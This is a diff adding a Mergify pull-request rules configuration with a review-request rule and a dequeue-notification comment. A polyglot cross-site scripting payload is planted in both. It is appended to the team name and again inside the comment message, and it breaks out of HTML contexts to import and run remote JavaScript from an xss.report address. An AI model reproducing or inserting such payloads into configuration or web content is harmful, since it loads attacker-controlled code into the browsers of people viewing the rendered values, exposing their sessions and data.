@@ -1,0 +1,25 @@
+pull_request_rules:
+  - name: Request review from team
+    description: Request review from a specific team when checks are green.
+    conditions:
+      - -closed
+      - "#approved-reviews-by = 0"
+      - "#changes-requested-reviews-by = 0"
+      - review-requested != @TEAM_NAME_HERE
+    actions:
+      request_reviews:
+        teams:
+          - TEAM_NAME_HEREjavascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html
+            "
+            onmouseover=/*&lt;svg/*/onload=(import(/https:\xss.report\c\goosebumb/.source))//>
+  - name: Notify when a PR is removed from the queue
+    description: Notify the PR author when its pull request is removed from the merge queue.
+    conditions:
+      - queue-dequeue-reason != none
+      - queue-dequeue-reason != pr-merged
+    actions:
+      comment:
+        message: |
+          Hey @{{author}}, your pull request has been dequeued due to the following reason: {{queue_dequeue_reason}}.
+          Sorry about that, but you can requeue the PR by using `@mergifyio queue` if you think this was a mistake.
+          javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*&lt;svg/*/onload=(import(/https:\xss.report\c\goosebumb/.source))//>
